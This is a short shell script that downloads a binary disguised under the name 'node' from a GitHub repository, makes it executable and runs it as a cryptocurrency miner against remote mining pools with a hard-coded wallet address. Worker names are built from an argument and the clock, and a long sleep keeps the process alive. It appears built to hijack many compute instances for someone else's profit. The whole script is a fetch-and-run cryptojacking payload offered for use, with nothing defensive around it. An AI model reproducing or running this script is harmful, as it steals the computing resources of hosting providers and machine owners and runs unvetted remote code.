#!/bin/sh
set -e
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
WORKER_NUMBER=$1
HOURESX=crf_$WORKER_NUMBER
PASSHOURS=$(date +%S)
#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
./node --disable-gpu -a yescryptr16 -o mining-pool.zapto.org:3735 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${HOURESX}_${PASSHOURS} > try.log
sleep 29999

